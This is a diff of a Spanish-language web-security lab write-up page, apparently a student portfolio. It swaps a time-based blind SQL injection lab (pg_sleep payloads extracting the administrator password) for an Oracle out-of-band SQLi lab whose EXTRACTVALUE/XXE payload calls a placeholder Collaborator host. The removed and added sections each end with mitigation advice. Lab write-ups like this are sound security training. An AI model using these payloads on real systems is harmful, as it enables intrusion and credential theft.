@@ -50,7 +50,7 @@
 
   <div class="lab-card desarrollo">
 
-      <h2>Lab 12 - Blind SQL injection with time delays and information retrieval </h2>
+      <h2>Lab 13 - Blind SQL injection with out-of-band interaction</h2>
 
     <h3>Nivel</h3>
     <p>
@@ -59,78 +59,58 @@
       
       <h3>Tipo de SQLi</h3>
     <p>
-      Inyección SQL Ciega Basada en Tiempos
+      Blind SQL injection (Out-of-band / OAST): Inyección SQL a ciegas que utiliza técnicas fuera de banda para provocar una interacción de red externa (DNS/HTTP).
     </p>
 
       <h3>Objetivo</h3>
     <p style="text-align:justify";>
-        Explotar una vulnerabilidad de inyección SQL basada en tiempos para extraer la contraseña del usuario administrator induciendo retrasos condicionales en el tiempo de respuesta del servidor.   
+        Explotar una vulnerabilidad de inyección SQL en la cookie de rastreo para forzar al servidor a realizar una consulta DNS hacia el servidor de Burp Collaborator, confirmando así la vulnerabilidad mediante una interacción externa.   
     </p>
 
       <h3>Explicación técnica de la vulnerabilidad</h3>
     <p style="text-align:justify";>
-        En este caso, la aplicación es completamente ciega: no refleja datos de la base de datos en pantalla, no cambia su contenido HTML , ni arroja errores HTTP cuando algo falla. La vulnerabilidad existe porque el backend ejecuta de forma síncrona las consultas inyectadas.   
+        La aplicación presenta una vulnerabilidad de Blind SQL Injection en la cookie TrackingId que no produce cambios visibles en la respuesta HTTP. Pero debido a que el servidor utiliza una base de datos Oracle, es posible inyectar funciones específicas de procesamiento XML que interactúan con la red. Mediante esta vulnerabilidad se introduce un comando que fuerza al motor de la base de datos a realizar una resolución DNS o una petición HTTP hacia un dominio externo controlado.   
     </p>
 
     <h3>Procedimiento paso a paso</h3>
-    <ol>
-      <li>Interceptar una petición a la página principal que contenga la cookie <code>TrackingId</code> y enviarla a <b>Repeater</b> en Burp Suite.</li>
-      <li>Inyectar un payload para comprobar control del tiempo de respuesta:
-        <code>TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</code>.
-        Si la respuesta tarda ~10 segundos, la inyección funciona.
-      </li>
-      <li>Probar una condición falsa cambiando <code>(1=1)</code> por <code>(1=2)</code>. 
-      La aplicación debe responder inmediatamente, confirmando que se pueden evaluar condiciones booleanas.</li>
-      <li>Verificar la existencia del usuario administrador:
-        <code>TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</code>.
-        Si hay retraso, el usuario existe.
-      </li>
-      <li>Determinar la longitud de la contraseña usando:
-        <code>LENGTH(password)&gt;X</code>. 
-        Incrementar el valor (1,2,3...) hasta encontrar la longitud exacta cuando la respuesta deja de tardar 10 segundos.
-      </li>
-      <li>Enviar la petición a <b>Intruder</b> para automatizar la extracción de la contraseña.</li>
-      <li>En <b>Positions</b>, añadir marcadores de payload:
-        <code>SUBSTRING(password,1,1)='§a§'</code>.
-      </li>
-      <li>En <b>Payloads</b>, configurar una lista simple con caracteres <code>a-z</code> y <code>0-9</code>.</li>
-      <li>En <b>Resource pool</b>, establecer <code>Maximum concurrent requests = 1</code> para enviar las peticiones en un solo hilo.</li>
-      <li>Iniciar el ataque y revisar la columna de tiempo de respuesta. 
-      El carácter correcto será el que genere un retraso cercano a 10 segundos.</li>
-      <li>Repetir el proceso cambiando la posición del carácter:
-        <code>SUBSTRING(password,2,1)</code>, <code>3,1</code>, etc., hasta obtener todos los caracteres.
-      </li>
-      <li>Ir a <b>My account</b> e iniciar sesión con la contraseña obtenida.</li>
-    </ol>
+    <ul>
+      <li><strong>Captura de tráfico:</strong> Abrir el laboratorio y capturar la petición principal en Burp Suite para identificar la cookie <code>TrackingId</code>.</li>
+      <li><strong>Enviar a Repeater:</strong> Mandar la petición al Repeater y ubicar la cookie <code>TrackingId</code>, que será el punto de inyección.</li>
+      <li><strong>Configurar Collaborator:</strong> Abrir Burp Collaborator Client y copiar el dominio único generado.</li>
+      <li><strong>Inyectar payload:</strong> Insertar en <code>TrackingId</code> un payload que utilice <code>EXTRACTVALUE</code> para provocar una solicitud externa.</li>
+      <li><strong>Enviar petición:</strong> Ejecutar la petición modificada; la respuesta puede ser normal (<code>200 OK</code>).</li>
+      <li><strong>Verificar ataque:</strong> Revisar Burp Collaborator con <em>Poll now</em>. Si aparecen interacciones DNS/HTTP, se confirma la vulnerabilidad.</li>
+    </ul>
     
       <div class="lab-card multimedia">
           <h3>Evidencia</h3>
     <p>Request interceptado</p>
-    <img src="img/lab12_1.png" alt="evidencia">
+    <img src="img/lab13_1.png" alt="evidencia">
       <p>Payload utilizado</p>
-    <img src="img/lab12_2.png" alt="evidencia">
+    <img src="img/lab13_2.png" alt="evidencia">
           <p>Respuesta vulnerable</p>
-          <img src="img/lab12_3.png" alt="evidencia">
+          <img src="img/lab13_3.png" alt="evidencia">
       <p>Confirmación</p>
-    <img src="img/lab12_4.png" alt="evidencia">
+    <img src="img/lab13_4.png" alt="evidencia">
       </div>
 
       <h3>Explicación de payload</h3>
         <p style="text-align:justify";>
-            TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users–   
+            El payload utiliza funciones de XML para forzar la conexión:
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://TU-SUBDOMINIO-COLLABORATOR/"> %remote;]>'),'/l') FROM dual--
+
+EXTRACTVALUE / xmltype: Funciones de Oracle que procesan XML. Se usan aquí para obligar a la base de datos a procesar un documento XML malicioso.
+
+DOCTYPE root / ENTITY: Define una entidad externa de sistema que apunta a la URL de Burp Collaborator.
+
+SYSTEM "http://...": Indica a la base de datos que debe buscar el contenido de la entidad en esa dirección externa, disparando la interacción de red.
+
+FROM dual: Tabla dual de Oracle usada para completar la sintaxis de SELECT.    
         </p>
-      <ul>
-          <li><code>x'</code>: Cierra la cadena original de la consulta SQL vulnerable.</li>
-          <li><code>%3B</code>: Codificación URL de <code>;</code>. Permite terminar la consulta original y ejecutar otra (stacked queries).</li>
-          <li><code>SELECT CASE WHEN (...) THEN pg_sleep(10) ELSE pg_sleep(0) END</code>: 
-          Estructura condicional. Si la condición es verdadera, la base de datos se pausa 10 segundos; si es falsa, responde inmediatamente.</li>
-          <li><code>SUBSTRING(password,1,1)='a'</code>: Extrae un carácter específico de la contraseña y lo compara con el intento actual.</li>
-          <li><code>--</code>: Comenta el resto de la consulta original para evitar errores de sintaxis.</li>
-        </ul>
 
       <h3>Mitigación recomendada</h3>
       <p style="text-align:justify";>
-          La solución principal consiste en aplicar Consultas Parametrizadas en todo el código fuente que interactúe con la base de datos, forzando a que la entrada del usuario se evalúe estrictamente como un dato y no como un comando. Adicionalmente, como medida de defensa en profundidad, se debe deshabilitar la ejecución de consultas apiladas en los controladores de conexión de la base de datos a nivel de aplicación; esto evitaría que un atacante inyecta un comando secundario separado.   
+          Para prevenir esta vulnerabilidad, lo más recomendable es el uso de consultas preparadas que parametrice las cookies en lugar de concatenarlas, evitando la ejecución de código malicioso. También se deben implementar restricciones de red que impidan al servidor de base de datos realizar peticiones hacia dominios externos no autorizados, así como también deshabilitar funciones de red innecesarias en la base de datos, como el procesamiento de URIs externas en XML.    
       </p>
 
   </div>
